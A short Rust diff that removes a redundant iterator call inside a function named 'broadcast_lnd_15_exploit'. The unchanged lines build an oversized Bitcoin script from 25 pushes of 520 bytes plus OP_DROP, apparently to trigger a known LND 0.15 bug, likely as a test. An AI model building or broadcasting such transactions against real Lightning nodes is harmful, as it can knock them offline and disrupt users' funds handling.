@@ -286,7 +286,7 @@ pub fn broadcast_lnd_15_exploit(
     )
     .unwrap();
 
-    let script_builder = (0..25).into_iter().fold(Builder::new(), |b, _| {
+    let script_builder = (0..25).fold(Builder::new(), |b, _| {
         b.push_slice(&vec![1; 520])
             .push_opcode(opcodes::all::OP_DROP)
     });
